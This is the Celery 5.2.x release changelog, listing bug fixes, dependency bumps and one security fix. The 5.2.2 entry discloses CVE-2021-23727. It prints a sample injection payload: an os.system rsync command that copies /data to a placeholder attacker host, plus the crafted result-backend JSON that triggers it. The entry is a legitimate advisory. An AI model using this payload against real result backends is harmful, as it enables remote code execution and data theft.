.. _changelog:

================
 Change history
================

This document contains change notes for bugfix & new features
in the & 5.2.x series, please see :ref:`whatsnew-5.2` for
an overview of what's new in Celery 5.2.


.. _version-5.2.5:

5.2.5
=====

:release-date: 2022-4-03 20:42 P.M UTC+2:00
:release-by: Omer Katz

- Use importlib instead of deprecated pkg_resources (#7218).

.. _version-5.2.4:

5.2.4
=====

:release-date: 2022-4-03 20:30 P.M UTC+2:00
:release-by: Omer Katz

- Expose more debugging information when receiving unknown tasks (#7404).

.. _version-5.2.3:

5.2.3
=====

:release-date: 2021-12-29 12:00 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Allow redis >= 4.0.2.
- Upgrade minimum required pymongo version to 3.11.1.
- tested pypy3.8 beta (#6998).
- Split Signature.__or__ into subclasses' __or__ (#7135).
- Prevent duplication in event loop on Consumer restart.
- Restrict setuptools>=59.1.1,<59.7.0.
- Kombu bumped to v5.2.3
- py-amqp bumped to v5.0.9
- Some docs & CI improvements.


.. _version-5.2.2:

5.2.2
=====

:release-date: 2021-12-26 16:30 P.M UTC+2:00
:release-by: Omer Katz

- Various documentation fixes.
- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).

    When a task fails, the failure information is serialized in the backend.
    In some cases, the exception class is only importable from the
    consumer's code base. In this case, we reconstruct the exception class
    so that we can re-raise the error on the process which queried the
    task's result. This was introduced in #4836.
    If the recreated exception type isn't an exception, this is a security issue.
    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:
    ``os.system("rsync /data attacker@192.168.56.100:~/data")``
    by setting the task's result to a failure in the result backend with the os,
    the system function as the exception type and the payload ``rsync /data attacker@192.168.56.100:~/data`` as the exception arguments like so:

    .. code-block:: python

        {
              "exc_module": "os",
              'exc_type': "system",
              "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        }

    According to my analysis, this vulnerability can only be exploited if
    the producer delayed a task which runs long enough for the
    attacker to change the result mid-flight, and the producer has
    polled for the task's result.
    The attacker would also have to gain access to the result backend.
    The severity of this security vulnerability is low, but we still
    recommend upgrading.


.. _version-5.2.1:

5.2.1
=====

:release-date: 2021-11-16 8.55 P.M UTC+6:00
:release-by: Asif Saif Uddin

- Fix rstrip usage on bytes instance in ProxyLogger.
- Pass logfile to ExecStop in celery.service example systemd file.
- fix: reduce latency of AsyncResult.get under gevent (#7052)
- Limit redis version: <4.0.0.
- Bump min kombu version to 5.2.2.
- Change pytz>dev to a PEP 440 compliant pytz>0.dev.0.
- Remove dependency to case (#7077).
- fix: task expiration is timezone aware if needed (#7065).
- Initial testing of pypy-3.8 beta to CI.
- Docs, CI & tests cleanups.


.. _version-5.2.0:

5.2.0
=====

:release-date: 2021-11-08 7.15 A.M UTC+6:00
:release-by: Asif Saif Uddin

- Prevent from subscribing to empty channels (#7040)
- fix register_task method.
- Fire task failure signal on final reject (#6980)
- Limit pymongo version: <3.12.1 (#7041)
- Bump min kombu version to 5.2.1

.. _version-5.2.0rc2:

5.2.0rc2
========

:release-date: 2021-11-02 1.54 P.M UTC+3:00
:release-by: Naomi Elstein

- Bump Python 3.10.0 to rc2.
- [pre-commit.ci] pre-commit autoupdate (#6972).
- autopep8.
- Prevent worker to send expired revoked items upon hello command (#6975).
- docs: clarify the 'keeping results' section (#6979).
- Update deprecated task module removal in 5.0 documentation (#6981).
- [pre-commit.ci] pre-commit autoupdate.
- try python 3.10 GA.
- mention python 3.10 on readme.
- Documenting the default consumer_timeout value for rabbitmq >= 3.8.15.
- Azure blockblob backend parametrized connection/read timeouts (#6978).
- Add as_uri method to azure block blob backend.
- Add possibility to override backend implementation with celeryconfig (#6879).
- [pre-commit.ci] pre-commit autoupdate.
- try to fix deprecation warning.
- [pre-commit.ci] pre-commit autoupdate.
- not needed anyore.
- not needed anyore.
- not used anymore.
- add github discussions forum

.. _version-5.2.0rc1:

5.2.0rc1
========
:release-date: 2021-09-26 4.04 P.M UTC+3:00
:release-by: Omer Katz

- Kill all workers when main process exits in prefork model (#6942).
- test kombu 5.2.0rc1 (#6947).
- try moto 2.2.x (#6948).
- Prepared Hacker News Post on Release Action.
- update setup with python 3.7 as minimum.
- update kombu on setupcfg.
- Added note about automatic killing all child processes of worker after its termination.
- [pre-commit.ci] pre-commit autoupdate.
- Move importskip before greenlet import (#6956).
- amqp: send expiration field to broker if requested by user (#6957).
- Single line drift warning.
- canvas: fix kwargs argument to prevent recursion (#6810) (#6959).
- Allow to enable Events with app.conf mechanism.
- Warn when expiration date is in the past.
- Add the Framework :: Celery trove classifier.
- Give indication whether the task is replacing another (#6916).
- Make setup.py executable.
- Bump version: 5.2.0b3 → 5.2.0rc1.

.. _version-5.2.0b3:

5.2.0b3
=======

:release-date: 2021-09-02 8.38 P.M UTC+3:00
:release-by: Omer Katz

- Add args to LOG_RECEIVED (fixes #6885) (#6898).
- Terminate job implementation for eventlet concurrency backend (#6917).
- Add cleanup implementation to filesystem backend (#6919).
- [pre-commit.ci] pre-commit autoupdate (#69).
- Add before_start hook (fixes #4110) (#6923).
- Restart consumer if connection drops (#6930).
- Remove outdated optimization documentation (#6933).
- added https verification check functionality in arangodb backend (#6800).
- Drop Python 3.6 support.
- update supported python versions on readme.
- [pre-commit.ci] pre-commit autoupdate (#6935).
- Remove appveyor configuration since we migrated to GA.
- pyugrade is now set to upgrade code to 3.7.
- Drop exclude statement since we no longer test with pypy-3.6.
- 3.10 is not GA so it's not supported yet.
- Celery 5.1 or earlier support Python 3.6.
- Fix linting error.
- fix: Pass a Context when chaining fail results (#6899).
- Bump version: 5.2.0b2 → 5.2.0b3.

.. _version-5.2.0b2:

5.2.0b2
=======

:release-date: 2021-08-17 5.35 P.M UTC+3:00
:release-by: Omer Katz

- Test windows on py3.10rc1 and pypy3.7 (#6868).
- Route chord_unlock task to the same queue as chord body (#6896).
- Add message properties to app.tasks.Context (#6818).
- handle already converted LogLevel and JSON (#6915).
- 5.2 is codenamed dawn-chorus.
- Bump version: 5.2.0b1 → 5.2.0b2.

.. _version-5.2.0b1:

5.2.0b1
=======

:release-date: 2021-08-11 5.42 P.M UTC+3:00
:release-by: Omer Katz

- Add Python 3.10 support (#6807).
- Fix docstring for Signal.send to match code (#6835).
- No blank line in log output (#6838).
- Chords get body_type independently to handle cases where body.type does not exist (#6847).
- Fix #6844 by allowing safe queries via app.inspect().active() (#6849).
- Fix multithreaded backend usage (#6851).
- Fix Open Collective donate button (#6848).
- Fix setting worker concurrency option after signal (#6853).
- Make ResultSet.on_ready promise hold a weakref to self (#6784).
- Update configuration.rst.
- Discard jobs on flush if synack isn't enabled (#6863).
- Bump click version to 8.0 (#6861).
- Amend IRC network link to Libera (#6837).
- Import celery lazily in pytest plugin and unignore flake8 F821, "undefined name '...'" (#6872).
- Fix inspect --json output to return valid json without --quiet.
- Remove celery.task references in modules, docs (#6869).
-  The Consul backend must correctly associate requests and responses (#6823).
